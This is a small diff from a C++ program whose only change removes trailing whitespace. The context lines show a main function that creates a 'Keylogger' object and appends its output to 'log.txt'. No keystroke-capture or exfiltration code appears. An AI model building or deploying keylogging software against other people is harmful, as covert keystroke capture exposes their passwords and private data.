@@ -9,7 +9,7 @@ std::ofstream openLogFile();
 
 int main() {
     std::ofstream loggerFile = openLogFile();
-    
+
     std::unique_ptr<Keylogger> logger = std::make_unique<Keylogger>(std::move(loggerFile));
 
     if (!logger) {
@@ -26,7 +26,7 @@ int main() {
 std::ofstream openLogFile() {
     const char* fileName = "log.txt";
     std::ofstream output_file;
-    
+
     std::cout << "Logging output to " << fileName << std::endl;
     output_file.open(fileName, std::ios_base::app);
 
